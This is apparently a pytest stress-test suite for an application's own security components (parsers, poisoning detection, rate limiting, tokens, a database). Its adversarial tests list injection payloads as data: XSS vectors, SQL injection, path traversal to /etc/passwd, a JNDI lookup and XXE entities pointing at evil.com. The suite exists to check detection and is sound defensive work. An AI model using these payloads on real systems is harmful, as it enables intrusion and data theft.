"""Comprehensive stress tests - 100+ multi-vector security tests.

This module contains extensive stress testing for all security components,
including adversarial inputs, fuzzing, concurrency, and edge cases.
"""

import json
import tempfile
import threading
import time
from pathlib import Path

import numpy as np
import pytest

from app.security import (
    AgentEncapsulation,
    DataPoisoningDefense,
    SecureDatabaseManager,
    SecureDataParser,
    SecurityMonitor,
)
from app.security.agent_security import NumericalProtection, RuntimeFuzzer
from app.security.web_service import (
    InputValidator,
    RateLimiter,
    SecureWebHandler,
)


class TestMassiveDataParsing:
    """Test parsing with massive amounts of data."""

    @pytest.mark.parametrize("size", [100, 1000, 5000])
    def test_large_json_arrays(self, size):
        """Test parsing large JSON arrays."""
        parser = SecureDataParser()

        data = {"items": [{"id": i, "value": f"item_{i}"} for i in range(size)]}
        json_str = json.dumps(data)

        result = parser.parse_json(json_str)
        assert result.validated
        assert len(result.data["items"]) == size

    @pytest.mark.parametrize("size", [100, 1000, 5000])
    def test_large_csv_datasets(self, size):
        """Test parsing large CSV datasets."""
        parser = SecureDataParser()

        lines = ["id,name,value"]
        lines.extend([f"{i},name_{i},{i*100}" for i in range(size)])
        csv_data = "\n".join(lines)

        result = parser.parse_csv(csv_data)
        assert result.validated
        assert len(result.data) == size

    @pytest.mark.parametrize("depth", [10, 20, 30])
    def test_deeply_nested_structures(self, depth):
        """Test deeply nested JSON structures."""
        parser = SecureDataParser()

        # Build nested structure
        nested = {"level": 0}
        current = nested
        for i in range(1, depth):
            current["child"] = {"level": i}
            current = current["child"]

        json_str = json.dumps(nested)
        result = parser.parse_json(json_str)
        assert result.validated


class TestAdversarialInputs:
    """Test with adversarial and malicious inputs."""

    @pytest.mark.parametrize(
        "payload",
        [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",
            "%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK",
            "../../../windows/win.ini",
            "1' UNION SELECT password FROM users--",
        ],
    )
    def test_injection_attacks(self, payload):
        """Test various injection attacks are detected."""
        defense = DataPoisoningDefense()

        is_poisoned, patterns = defense.check_for_poison(payload)
        assert is_poisoned or len(patterns) > 0

    @pytest.mark.parametrize(
        "xml_payload",
        [
            """<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>""",
            """<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">""",
        ],
    )
    def test_xml_attacks(self, xml_payload):
        """Test XML-specific attacks."""
        parser = SecureDataParser()

        result = parser.parse_xml(xml_payload)
        assert not result.validated or len(result.issues) > 0

    @pytest.mark.parametrize("count", [10, 50, 100])
    def test_repeated_attacks(self, count):
        """Test repeated attack attempts."""
        defense = DataPoisoningDefense()

        attack = "<script>alert('xss')</script>"

        for _ in range(count):
            is_poisoned, _ = defense.check_for_poison(attack)
            assert is_poisoned

        # Should still detect after many attempts
        is_poisoned, _ = defense.check_for_poison(attack)
        assert is_poisoned


class TestConcurrentOperations:
    """Test concurrent access patterns."""

    @pytest.mark.parametrize("thread_count", [5, 10, 20])
    def test_concurrent_parsing(self, thread_count):
        """Test concurrent data parsing."""
        parser = SecureDataParser()
        results = []
        errors = []

        def parse_task(index):
            try:
                data = {"id": index, "value": f"test_{index}"}
                result = parser.parse_json(json.dumps(data))
                results.append(result.validated)
            except Exception as e:
                errors.append(str(e))

        threads = []
        for i in range(thread_count):
            t = threading.Thread(target=parse_task, args=(i,))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        assert len(errors) == 0
        assert all(results)

    @pytest.mark.parametrize("agent_count", [5, 10, 20])
    def test_concurrent_agent_access(self, agent_count):
        """Test concurrent agent state access."""
        agents = [AgentEncapsulation(f"agent_{i}") for i in range(agent_count)]
        errors = []

        def access_agent(agent, value):
            try:
                agent.set_state("counter", value, caller=f"thread_{value}")
                retrieved = agent.get_state("counter", caller=f"thread_{value}")
                assert retrieved == value
            except Exception as e:
                errors.append(str(e))

        threads = []
        for i, agent in enumerate(agents):
            t = threading.Thread(target=access_agent, args=(agent, i))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        assert len(errors) == 0

    @pytest.mark.parametrize("db_threads", [5, 10, 20])
    def test_concurrent_database_writes(self, db_threads):
        """Test concurrent database operations."""
        with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as tmp:
            db = SecureDatabaseManager(tmp.name)
            errors = []

            def db_task(index):
                try:
                    db.insert_user(f"user_{index}", f"hash_{index}")
                    user = db.get_user(f"user_{index}")
                    assert user is not None
                except Exception as e:
                    if "UNIQUE constraint" not in str(e):
                        errors.append(str(e))

            threads = []
            for i in range(db_threads):
                t = threading.Thread(target=db_task, args=(i,))
                threads.append(t)
                t.start()

            for t in threads:
                t.join()

            assert len(errors) == 0

            # Cleanup
            Path(tmp.name).unlink()


class TestNumericalAdversaries:
    """Test numerical adversarial attacks."""

    @pytest.mark.parametrize(
        "attack_value",
        [
            np.inf,
            -np.inf,
            np.nan,
            1e308,
            -1e308,
            2**63 - 1,
            -(2**63),
        ],
    )
    def test_extreme_values(self, attack_value):
        """Test extreme numerical values."""
        protection = NumericalProtection()

        arr = np.array([1, 2, 3, attack_value])

        # Should detect as invalid
        assert not protection.validate_numerical_input(arr)

    @pytest.mark.parametrize("size", [100, 1000, 10000])
    def test_large_arrays(self, size):
        """Test large array processing."""
        protection = NumericalProtection()

        arr = np.random.randn(size)

        # Should handle large arrays
        clipped = protection.clip_array(arr)
        assert len(clipped) == size

        # Should remove outliers
        with_outliers = np.concatenate([arr, np.array([1e6, -1e6])])
        filtered = protection.remove_outliers(with_outliers)
        assert len(filtered) < len(with_outliers)

    def test_adversarial_division(self):
        """Test division by zero and near-zero attacks."""
        protection = NumericalProtection()

        numerator = np.array([10, 20, 30, 40, 50])
        denominator = np.array([2, 0, 1e-100, 5, 0])

        result = protection.safe_divide(numerator, denominator)

        # Should not have NaN or Inf
        assert not np.any(np.isnan(result))
        assert not np.any(np.isinf(result))


class TestFuzzingCampaigns:
    """Comprehensive fuzzing tests."""

    @pytest.mark.parametrize(
        "strategy", ["random_string", "boundary_values", "type_confusion", "overflow"]
    )
    @pytest.mark.parametrize("iterations", [10, 20, 50])
    def test_fuzzing_strategies(self, strategy, iterations):
        """Test different fuzzing strategies."""
        fuzzer = RuntimeFuzzer()

        for i in range(iterations):
            cases = fuzzer.fuzz_input(strategy, f"base_{i}")
            assert len(cases) > 0

    def test_parser_fuzzing(self):
        """Fuzz test data parsers."""
        parser = SecureDataParser()
        fuzzer = RuntimeFuzzer()

        # Fuzz JSON parser
        json_cases = fuzzer.fuzz_input("random_string", "")
        for case in json_cases[:20]:  # Test first 20
            try:
                result = parser.parse_json(str(case))
                # Should either parse or reject gracefully
                assert isinstance(result.validated, bool)
            except Exception:
                pass  # Expected for invalid input

    def test_validator_fuzzing(self):
        """Fuzz test input validators."""
        validator = InputValidator()
        fuzzer = RuntimeFuzzer()

        cases = fuzzer.fuzz_input("overflow", "")

        for case in cases[:10]:
            try:
                # Should handle gracefully
                validator.validate_input(str(case)[:10000], "text/plain")
            except Exception as e:
                # Should not crash
                assert "internal" not in str(e).lower()


class TestRateLimitingEdgeCases:
    """Test rate limiting edge cases."""

    def test_burst_traffic(self):
        """Test burst traffic patterns."""
        limiter = RateLimiter(max_requests=10, window=1)

        # Burst exactly at limit
        for _i in range(10):
            assert limiter.check_rate_limit("client1")

        # 11th should fail
        assert not limiter.check_rate_limit("client1")

    def test_distributed_attacks(self):
        """Test distributed attack patterns."""
        limiter = RateLimiter(max_requests=5, window=1)

        # Attack from multiple IPs
        for ip_suffix in range(100):
            client_ip = f"192.168.1.{ip_suffix}"

            for _ in range(5):
                assert limiter.check_rate_limit(client_ip)

            # 6th from each IP should fail
            assert not limiter.check_rate_limit(client_ip)

    def test_time_based_recovery(self):
        """Test rate limit recovery over time."""
        limiter = RateLimiter(max_requests=5, window=1)

        # Exhaust limit
        for _ in range(5):
            limiter.check_rate_limit("client1")

        # Wait for window
        time.sleep(1.1)

        # Should allow again
        assert limiter.check_rate_limit("client1")


class TestEventStormDetection:
    """Test detection of event storms."""

    @pytest.mark.parametrize("event_count", [100, 500, 1000])
    def test_high_volume_events(self, event_count):
        """Test high-volume event logging."""
        monitor = SecurityMonitor()

        for i in range(event_count):
            monitor.log_security_event(
                event_type=f"event_{i % 10}",
                severity="low",
                source="stress_test",
                description=f"Event {i}",
            )

        stats = monitor.get_event_statistics()
        assert stats["total_events"] == event_count

    def test_anomaly_storm(self):
        """Test anomaly detection during event storm."""
        monitor = SecurityMonitor()

        # Generate normal traffic
        for _ in range(50):
            monitor.log_security_event(
                event_type="normal_event",
                severity="low",
                source="app",
                description="Normal",
            )

        # Generate attack storm
        for _ in range(100):
            monitor.log_security_event(
                event_type="attack_event",
                severity="high",
                source="attacker",
                description="Attack",
            )

        # Should detect anomaly
        anomalies = monitor.detect_anomalies(threshold=20)
        assert len(anomalies) > 0
        assert any(a["event_type"] == "attack_event" for a in anomalies)


class TestDatabaseStress:
    """Database stress and edge case tests."""

    def test_rapid_transactions(self):
        """Test rapid transaction execution."""
        with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as tmp:
            db = SecureDatabaseManager(tmp.name)

            # Rapid inserts
            for i in range(100):
                db.insert_user(f"user_{i}", f"hash_{i}")

            # Rapid queries
            for i in range(100):
                user = db.get_user(f"user_{i}")
                assert user is not None

            Path(tmp.name).unlink()

    def test_transaction_rollbacks(self):
        """Test multiple transaction rollbacks."""
        with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as tmp:
            db = SecureDatabaseManager(tmp.name)

            rollback_count = 0

            for i in range(10):
                try:
                    with db.transaction() as conn:
                        cursor = conn.cursor()
                        cursor.execute(
                            "INSERT INTO users (username, password_hash) VALUES (?, ?)",
                            (f"user_{i}", f"hash_{i}"),
                        )

                        if i % 2 == 0:
                            raise RuntimeError("Forced rollback")

                except RuntimeError:
                    rollback_count += 1

            # Half should have rolled back
            assert rollback_count == 5

            # Only 5 users should exist
            with db._get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute("SELECT COUNT(*) FROM users")
                count = cursor.fetchone()[0]
                assert count == 5

            Path(tmp.name).unlink()

    def test_massive_audit_log(self):
        """Test massive audit log generation."""
        with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as tmp:
            db = SecureDatabaseManager(tmp.name)

            # Generate 1000 audit entries
            for i in range(1000):
                db.log_action(
                    user_id=i % 10,
                    action=f"action_{i % 5}",
                    resource=f"resource_{i}",
                    details={"index": i},
                )

            # Query should still be fast
            log = db.get_audit_log(limit=100)
            assert len(log) == 100

            Path(tmp.name).unlink()


class TestCapabilityTokens:
    """Test capability-based access control edge cases."""

    def test_token_collision(self):
        """Test token uniqueness."""
        handler = SecureWebHandler()

        tokens = set()
        for _ in range(100):
            token = handler.generate_capability_token(["read"])
            assert token not in tokens
            tokens.add(token)

    def test_revocation(self):
        """Test token revocation."""
        handler = SecureWebHandler()

        token = handler.generate_capability_token(["read", "write"])

        # Should work
        assert handler.check_capability(token, "read")

        # Revoke by removing from capabilities
        del handler.capabilities[token]

        # Should fail
        assert not handler.check_capability(token, "read")

    def test_privilege_escalation_attempt(self):
        """Test privilege escalation prevention."""
        handler = SecureWebHandler()

        # Limited token
        token = handler.generate_capability_token(["read"])

        # Should allow read
        assert handler.check_capability(token, "read")

        # Should deny write
        assert not handler.check_capability(token, "write")
        assert not handler.check_capability(token, "delete")
        assert not handler.check_capability(token, "admin")


class TestUnicodeAndEncoding:
    """Test Unicode and encoding edge cases."""

    @pytest.mark.parametrize(
        "text",
        [
            "Hello World",
            "你好世界",
            "Привет мир",
            "مرحبا بالعالم",
            "🌍🌎🌏",
            "mixed 文字 text テキスト",
        ],
    )
    def test_unicode_parsing(self, text):
        """Test Unicode text parsing."""
        parser = SecureDataParser()

        data = {"text": text}
        json_str = json.dumps(data, ensure_ascii=False)

        result = parser.parse_json(json_str)
        assert result.validated
        assert result.data["text"] == text

    def test_encoding_attacks(self):
        """Test encoding-based attacks."""
        parser = SecureDataParser()

        # URL encoding
        encoded = "%3Cscript%3Ealert('xss')%3C/script%3E"

        # Should be treated as plain text
        result = parser.parse_json(json.dumps({"data": encoded}))
        assert result.validated


class TestMemoryLimits:
    """Test memory consumption limits."""

    def test_bounded_memory_usage(self):
        """Test that operations respect memory bounds."""
        parser = SecureDataParser()

        # Try to parse very large structure
        # Should be rejected before consuming excessive memory
        large_data = '{"data": "' + ("A" * (100 * 1024 * 1024)) + '"}'

        result = parser.parse_json(large_data)
        assert not result.validated


# Generate parameterized tests dynamically
def generate_xss_payloads():
    """Generate XSS test payloads."""
    return [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "javascript:alert(1)",
        "<iframe src=javascript:alert(1)>",
        "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<select onfocus=alert(1) autofocus>",
        "<textarea onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>",
    ]


class TestXSSVectors:
    """Test various XSS attack vectors."""

    @pytest.mark.parametrize("payload", generate_xss_payloads())
    def test_xss_detection(self, payload):
        """Test XSS payload detection."""
        defense = DataPoisoningDefense()

        is_poisoned, patterns = defense.check_for_poison(payload)
        assert is_poisoned

    @pytest.mark.parametrize("payload", generate_xss_payloads())
    def test_xss_sanitization(self, payload):
        """Test XSS payload sanitization."""
        defense = DataPoisoningDefense()

        sanitized = defense.sanitize_input(payload)

        # Sanitized version should not trigger detection
        is_poisoned, _ = defense.check_for_poison(sanitized)
        # May still have patterns but should be safer
        assert "<script>" not in sanitized.lower()


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
